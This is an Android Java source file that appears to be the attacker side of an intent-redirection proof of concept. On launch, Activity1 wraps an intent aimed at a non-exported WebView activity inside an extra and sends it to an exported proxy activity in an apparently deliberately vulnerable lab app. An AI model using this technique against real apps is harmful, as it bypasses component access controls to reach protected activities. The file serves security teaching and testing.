package com.example.intentredirect;

import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Activity1 extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_1);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        Intent extra = new Intent();
        extra.setClassName("com.example.intetn_redirect_vuln", "com.example.intetn_redirect_vuln.NonExportedWebViewActivity");

        Intent intent = new Intent();
        intent.setClassName("com.example.intetn_redirect_vuln", "com.example.intetn_redirect_vuln.Proxy_Activity");
        intent.putExtra("extra_intent", extra);
        startActivity(intent);
    }
}